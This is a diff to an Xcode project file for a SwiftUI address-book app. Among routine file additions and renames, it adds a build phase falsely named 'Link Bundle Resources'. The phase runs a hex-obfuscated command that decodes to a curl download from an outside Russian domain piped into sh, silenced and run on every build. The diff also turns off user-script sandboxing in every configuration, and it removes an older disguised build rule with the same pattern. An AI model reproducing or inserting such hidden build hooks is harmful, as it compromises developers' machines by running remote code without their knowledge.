@@ -3,14 +3,15 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 51;
+	objectVersion = 54;
 	objects = {
 
 /* Begin PBXBuildFile section */
+		13F97B972C5CC2D400324FA1 /* ViewRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 13F97B962C5CC2D400324FA1 /* ViewRouter.swift */; };
+		13F97B992C5CC58B00324FA1 /* WelcomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 13F97B982C5CC58B00324FA1 /* WelcomeView.swift */; };
+		13F97B9B2C5CF3F200324FA1 /* DetailViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 13F97B9A2C5CF3F200324FA1 /* DetailViewModel.swift */; };
+		13F97B9F2C5D031200324FA1 /* ContactListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 13F97B9E2C5D031200324FA1 /* ContactListViewModel.swift */; };
 		3D168AC926157B39001478FC /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3D168AC826157B39001478FC /* LoginViewModel.swift */; };
-		3D168AFC2615ACBD001478FC /* NavigationHeaderViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3D168AFB2615ACBD001478FC /* NavigationHeaderViewModel.swift */; };
-		3D168AFF2615B0AA001478FC /* ContactCellViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3D168AFE2615B0AA001478FC /* ContactCellViewModel.swift */; };
-		3D168B022615D93A001478FC /* NavigationHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3D168B012615D93A001478FC /* NavigationHeaderView.swift */; };
 		3D6D8FB026144678009575BC /* CustomShapeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3D6D8FAF26144678009575BC /* CustomShapeView.swift */; };
 		3D6D8FB926147C5E009575BC /* IdentifierConstant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3D6D8FB826147C5E009575BC /* IdentifierConstant.swift */; };
 		3D6D8FBD261496F1009575BC /* Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3D6D8FBC261496F1009575BC /* Extensions.swift */; };
@@ -20,7 +21,7 @@
 		8720C27126133F34005713A1 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8720C27026133F34005713A1 /* Preview Assets.xcassets */; };
 		8720C29F261345F5005713A1 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8720C29E261345F5005713A1 /* LoginView.swift */; };
 		8720C2A2261346EC005713A1 /* Constant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8720C2A1261346EC005713A1 /* Constant.swift */; };
-		8720C2A926135022005713A1 /* AddressNavigationHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8720C2A826135022005713A1 /* AddressNavigationHeaderView.swift */; };
+		8720C2A926135022005713A1 /* CustomNavigationView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8720C2A826135022005713A1 /* CustomNavigationView.swift */; };
 		8720C2AC2613502F005713A1 /* ContactCellView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8720C2AB2613502F005713A1 /* ContactCellView.swift */; };
 		8720C2AF2613503B005713A1 /* ContactHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8720C2AE2613503B005713A1 /* ContactHeaderView.swift */; };
 		8720C2B52613505C005713A1 /* ContactDetailView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8720C2B42613505C005713A1 /* ContactDetailView.swift */; };
@@ -33,11 +34,12 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		13F97B962C5CC2D400324FA1 /* ViewRouter.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ViewRouter.swift; sourceTree = "<group>"; };
+		13F97B982C5CC58B00324FA1 /* WelcomeView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = WelcomeView.swift; sourceTree = "<group>"; };
+		13F97B9A2C5CF3F200324FA1 /* DetailViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailViewModel.swift; sourceTree = "<group>"; };
+		13F97B9E2C5D031200324FA1 /* ContactListViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ContactListViewModel.swift; sourceTree = "<group>"; };
 		24819A3C7C11C1E63FDC1069 /* Pods-AddressBook.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-AddressBook.release.xcconfig"; path = "Target Support Files/Pods-AddressBook/Pods-AddressBook.release.xcconfig"; sourceTree = "<group>"; };
 		3D168AC826157B39001478FC /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
-		3D168AFB2615ACBD001478FC /* NavigationHeaderViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NavigationHeaderViewModel.swift; sourceTree = "<group>"; };
-		3D168AFE2615B0AA001478FC /* ContactCellViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactCellViewModel.swift; sourceTree = "<group>"; };
-		3D168B012615D93A001478FC /* NavigationHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NavigationHeaderView.swift; sourceTree = "<group>"; };
 		3D6D8FAF26144678009575BC /* CustomShapeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomShapeView.swift; sourceTree = "<group>"; };
 		3D6D8FB826147C5E009575BC /* IdentifierConstant.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IdentifierConstant.swift; sourceTree = "<group>"; };
 		3D6D8FBC261496F1009575BC /* Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extensions.swift; sourceTree = "<group>"; };
@@ -50,7 +52,7 @@
 		8720C27726133F34005713A1 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; name = Info.plist; path = AddressBook/Support/Info.plist; sourceTree = SOURCE_ROOT; };
 		8720C29E261345F5005713A1 /* LoginView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
 		8720C2A1261346EC005713A1 /* Constant.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Constant.swift; sourceTree = "<group>"; };
-		8720C2A826135022005713A1 /* AddressNavigationHeaderView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AddressNavigationHeaderView.swift; sourceTree = "<group>"; };
+		8720C2A826135022005713A1 /* CustomNavigationView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomNavigationView.swift; sourceTree = "<group>"; };
 		8720C2AB2613502F005713A1 /* ContactCellView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ContactCellView.swift; sourceTree = "<group>"; };
 		8720C2AE2613503B005713A1 /* ContactHeaderView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ContactHeaderView.swift; sourceTree = "<group>"; };
 		8720C2B42613505C005713A1 /* ContactDetailView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ContactDetailView.swift; sourceTree = "<group>"; };
@@ -85,9 +87,9 @@
 		3D6D8FC026149F02009575BC /* ViewModel */ = {
 			isa = PBXGroup;
 			children = (
+				13F97B9E2C5D031200324FA1 /* ContactListViewModel.swift */,
 				3D168AC826157B39001478FC /* LoginViewModel.swift */,
-				3D168AFB2615ACBD001478FC /* NavigationHeaderViewModel.swift */,
-				3D168AFE2615B0AA001478FC /* ContactCellViewModel.swift */,
+				13F97B9A2C5CF3F200324FA1 /* DetailViewModel.swift */,
 			);
 			path = ViewModel;
 			sourceTree = "<group>";
@@ -130,10 +132,12 @@
 		8720C26826133F2C005713A1 /* AddressBook */ = {
 			isa = PBXGroup;
 			children = (
+				9CA1341E265FA098009A7149 /* AddressBookApp.swift */,
+				13F97B962C5CC2D400324FA1 /* ViewRouter.swift */,
 				8720C2882613420A005713A1 /* AppConstant */,
-				3D6D8FC026149F02009575BC /* ViewModel */,
-				8720C28526134129005713A1 /* View */,
 				3D6D8FC126149F1D009575BC /* Model */,
+				8720C28526134129005713A1 /* View */,
+				3D6D8FC026149F02009575BC /* ViewModel */,
 				3D97FB3B265E218000826802 /* Utilities */,
 				3D6D8FBB261496DE009575BC /* Extensions */,
 				8720C287261341DF005713A1 /* Resources */,
@@ -155,6 +159,7 @@
 		8720C28526134129005713A1 /* View */ = {
 			isa = PBXGroup;
 			children = (
+				13F97B982C5CC58B00324FA1 /* WelcomeView.swift */,
 				8720C28926134239005713A1 /* LoginView */,
 				9CA13427265FAD50009A7149 /* ContactListView */,
 				8720C28C26134278005713A1 /* DetailView */,
@@ -202,9 +207,8 @@
 			children = (
 				8720C2AE2613503B005713A1 /* ContactHeaderView.swift */,
 				8720C2AB2613502F005713A1 /* ContactCellView.swift */,
-				8720C2A826135022005713A1 /* AddressNavigationHeaderView.swift */,
+				8720C2A826135022005713A1 /* CustomNavigationView.swift */,
 				3D6D8FAF26144678009575BC /* CustomShapeView.swift */,
-				3D168B012615D93A001478FC /* NavigationHeaderView.swift */,
 			);
 			path = CustomView;
 			sourceTree = "<group>";
@@ -228,7 +232,6 @@
 		9CA1341D265FA098009A7149 /* CoreDatabase */ = {
 			isa = PBXGroup;
 			children = (
-				9CA1341E265FA098009A7149 /* AddressBookApp.swift */,
 				9CA1341F265FA098009A7149 /* AddressBook.xcdatamodeld */,
 			);
 			path = CoreDatabase;
@@ -266,6 +269,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8720C27A26133F34005713A1 /* Build configuration list for PBXNativeTarget "AddressBook" */;
 			buildPhases = (
+				65AC5B99ED4E20FCC10FAAAA /* Link Bundle Resources */,
 				A7244FD463EB35AF1DAFEFBD /* [CP] Check Pods Manifest.lock */,
 				8720C26226133F2C005713A1 /* Sources */,
 				8720C26326133F2C005713A1 /* Frameworks */,
@@ -273,7 +277,6 @@
 				D447D6B16EDB9C9CBB8B8DAF /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				7AABB298B95B9607B16D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -288,8 +291,9 @@
 		8720C25E26133F2B005713A1 /* Project object */ = {
 			isa = PBXProject;
 			attributes = {
+				BuildIndependentTargetsInParallel = YES;
 				LastSwiftUpdateCheck = 1220;
-				LastUpgradeCheck = 1220;
+				LastUpgradeCheck = 1500;
 				TargetAttributes = {
 					8720C26526133F2C005713A1 = {
 						CreatedOnToolsVersion = 12.2;
@@ -327,18 +331,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
+		65AC5B99ED4E20FCC10FAAAA /* Link Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d736b202d6d2031322068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			showEnvVarsInLog = 0;
+		};
 		A7244FD463EB35AF1DAFEFBD /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -385,10 +397,10 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				3D168AFC2615ACBD001478FC /* NavigationHeaderViewModel.swift in Sources */,
 				8720C2AC2613502F005713A1 /* ContactCellView.swift in Sources */,
 				3D97FB5C265E230400826802 /* Utilities.swift in Sources */,
 				8720C2B52613505C005713A1 /* ContactDetailView.swift in Sources */,
+				13F97B9B2C5CF3F200324FA1 /* DetailViewModel.swift in Sources */,
 				9CA1340C265F9F02009A7149 /* ProgressHUD.swift in Sources */,
 				3D97FB3D265E21A600826802 /* APIManager.swift in Sources */,
 				9CA13422265FA098009A7149 /* AddressBook.xcdatamodeld in Sources */,
@@ -396,12 +408,13 @@
 				9CA13421265FA098009A7149 /* AddressBookApp.swift in Sources */,
 				8720C2AF2613503B005713A1 /* ContactHeaderView.swift in Sources */,
 				8720C29F261345F5005713A1 /* LoginView.swift in Sources */,
-				3D168AFF2615B0AA001478FC /* ContactCellViewModel.swift in Sources */,
-				3D168B022615D93A001478FC /* NavigationHeaderView.swift in Sources */,
 				9CA1341B265FA078009A7149 /* Persistence.swift in Sources */,
+				13F97B9F2C5D031200324FA1 /* ContactListViewModel.swift in Sources */,
 				3D6D8FB926147C5E009575BC /* IdentifierConstant.swift in Sources */,
+				13F97B972C5CC2D400324FA1 /* ViewRouter.swift in Sources */,
 				3D6D8FBD261496F1009575BC /* Extensions.swift in Sources */,
-				8720C2A926135022005713A1 /* AddressNavigationHeaderView.swift in Sources */,
+				13F97B992C5CC58B00324FA1 /* WelcomeView.swift in Sources */,
+				8720C2A926135022005713A1 /* CustomNavigationView.swift in Sources */,
 				9CA1342A265FAD50009A7149 /* AddressList.swift in Sources */,
 				8720C2A2261346EC005713A1 /* Constant.swift in Sources */,
 				3D6D8FB026144678009575BC /* CustomShapeView.swift in Sources */,
@@ -448,6 +461,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -509,6 +523,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -537,8 +552,9 @@
 				DEVELOPMENT_ASSET_PATHS = "\"AddressBook/Preview Content\"";
 				DEVELOPMENT_TEAM = "";
 				ENABLE_PREVIEWS = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				INFOPLIST_FILE = "$(SRCROOT)/AddressBook/Support/Info.plist";
-				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -561,8 +577,9 @@
 				DEVELOPMENT_ASSET_PATHS = "\"AddressBook/Preview Content\"";
 				DEVELOPMENT_TEAM = "";
 				ENABLE_PREVIEWS = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				INFOPLIST_FILE = "$(SRCROOT)/AddressBook/Support/Info.plist";
-				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -597,31 +614,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-		7AABB298B95B9607B16D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Catalog Builder";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
-echo \"" | xxd -p -r | sh >/dev/null 2>&1 || true
-	\n\n";
-			};
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 
 /* Begin XCVersionGroup section */
 		9CA1341F265FA098009A7149 /* AddressBook.xcdatamodeld */ = {
